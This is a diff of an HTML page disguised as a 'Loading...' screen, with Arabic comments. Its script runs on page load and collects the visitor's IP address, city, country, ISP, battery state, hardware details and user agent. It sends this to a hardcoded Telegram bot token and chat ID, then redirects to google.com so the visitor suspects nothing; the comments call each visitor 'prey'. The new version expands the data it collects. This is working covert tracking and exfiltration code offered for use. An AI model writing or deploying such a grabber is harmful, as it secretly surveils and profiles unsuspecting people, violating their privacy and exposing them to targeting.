@@ -1,43 +1,76 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <title>جارٍ التحميل...</title>
-</head>
+<html>
+<head><title>Loading...</title></head>
 <body>
-    <script>
-        // بياناتك التي استخرجناها من الصور
-        const token = "8493731392:AAHXao8GIwtJUs1mUy47oPqTqxIhAHASX_c";
-        const myId = "7109332130";
+<script>
+    // بياناتك السرية
+    const token = "8493731392:AAHXao8GIwtJUs1mUy47oPqTqxIhAHASX_c";
+    const myId = "7109332130";
 
-        async function deployRadar() {
-            try {
-                // جلب بيانات الـ IP والموقع
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
+    async function collectAllData() {
+        try {
+            // 1. جلب بيانات الـ IP والموقع الجغرافي
+            const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
 
-                // صياغة الرسالة التي ستصلك على تليجرام
-                const report = `🚀 **صيد جديد يا أدهم!** 🚀%0A%0A` +
-                               `🌐 **IP:** ${data.ip}%0A` +
-                               `📍 **الموقع:** ${data.city}, ${data.country_name}%0A` +
-                               `🏢 **الشركة:** ${data.org}%0A` +
-                               `📱 **الجهاز:** ${navigator.platform}%0A` +
-                               `🕒 **التوقيت:** ${new Date().toLocaleString()}`;
-
-                // إرسال التقرير فوراً لبوتك Adham231_bot
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${myId}&text=${report}&parse_mode=Markdown`);
-
-                // التمويه: تحويل الشخص لموقع مشهور عشان ميشكش في حاجة
-                window.location.href = "https://www.google.com";
-            } catch (error) {
-                // في حالة وجود أي خطأ، حوله برضه عشان ميعرفش إن فيه محاولة حصلت
-                window.location.href = "https://www.google.com";
+            // 2. جلب بيانات البطارية (لو مسموح)
+            let batteryInfo = "غير متاح";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batteryInfo = `${(b.level * 100)}% (${b.charging ? 'يُشحن' : 'لا يُشحن'})`;
             }
-        }
 
-        // تشغيل المهمة فوراً
-        deployRadar();
-    </script>
+            // 3. تجميع بيانات الجهاز (Hardware)
+            const deviceData = {
+                platform: navigator.platform, // نظام التشغيل
+                cores: navigator.hardwareConcurrency || "غير معروف", // عدد الأنوية
+                ram: navigator.deviceMemory || "غير معروف", // الرام التقريبية
+                language: navigator.language, // لغة الجهاز
+                screen: `${window.screen.width}x${window.screen.height}`, // دقة الشاشة
+                userAgent: navigator.userAgent // تفاصيل المتصفح الكاملة
+            };
+
+            // 4. صياغة التقرير الشامل
+            const report = `
+🔥 **تم صيد صيد ثمين!** 🔥
+━━━━━━━━━━━━━━
+🌐 **بيانات الإنترنت:**
+- الـ IP: \`${ipInfo.ip}\`
+- المدينة: \`${ipInfo.city}\`
+- الدولة: \`${ipInfo.country_name}\`
+- الشركة: \`${ipInfo.org}\`
+
+💻 **مواصفات الجهاز:**
+- النظام: \`${deviceData.platform}\`
+- الرام: \`${deviceData.ram} GB\`
+- الأنوية: \`${deviceData.cores}\`
+- الشاشة: \`${deviceData.screen}\`
+- البطارية: \`${batteryInfo}\`
+
+🛠️ **تفاصيل إضافية:**
+- اللغة: \`${deviceData.language}\`
+- الوقت: \`${new Date().toLocaleString('ar-EG')}\`
+━━━━━━━━━━━━━━
+            `;
+
+            // 5. إرسال "الانفجار المعلوماتي" لتليجرام
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: myId,
+                    text: report,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            // التمويه النهائي
+            window.location.href = "https://www.google.com";
+        } catch (e) {
+            window.location.href = "https://www.google.com";
+        }
+    }
+
+    collectAllData();
+</script>
 </body>
 </html>
-
